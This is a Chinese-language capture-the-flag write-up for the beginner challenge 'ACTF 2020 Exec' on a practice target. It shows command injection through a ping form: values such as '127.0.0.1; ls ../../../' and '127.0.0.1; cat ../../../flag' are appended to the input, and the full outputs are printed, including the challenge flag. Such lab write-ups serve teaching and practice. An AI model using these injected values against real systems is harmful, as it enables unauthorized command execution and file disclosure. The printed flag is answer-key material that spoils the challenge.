---
tags:
  - BuuCTF
  - 新手
---

# \[ACTF 2020 新生赛\] Exec

## 前置工作

打开靶机，看到如下画面，标题叫 `command execution`，他的页面上看他能 PING，于是我就 PING 了一下 127.0.0.1，看起来像是 Linux 系统的 PING

![](https://p.sda1.dev/13/f3becaa967e319af51db168013617399/image.png)

## 并行命令

不由得想试试看接上分号 `;` 后进行命令并行，那就先传入一个 `127.0.0.1; ls ./`，回应如下

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.078 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.106 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.136 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.078/0.106/0.136 ms
index.php
```

貌似没有 Flag，那就再传入 `127.0.0.1; ls ../`，回应如下

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.071 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.133 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.113 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.071/0.105/0.133 ms
html
localhost
```

还是没有 Flag，那就再试 `127.0.0.1; ls ../../`

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.097 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.137 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.131 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.097/0.121/0.137 ms
cache
empty
lib
local
lock
log
mail
opt
run
spool
tmp
www
```

再上面就是根目录 `/` 了，只能再试试看 `127.0.0.1; ls ../../../`

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.104 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.126 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.100 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.110/0.126 ms
bin
dev
etc
flag
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

终于看到了一个叫 `flag` 的文件，我们尝试下去读取他 `127.0.0.1; cat ../../../flag`，得到 Flag

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.097 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.149 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.123 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.097/0.123/0.149 ms
flag{c6000520-b03d-49c8-a628-2d26af095af7}
```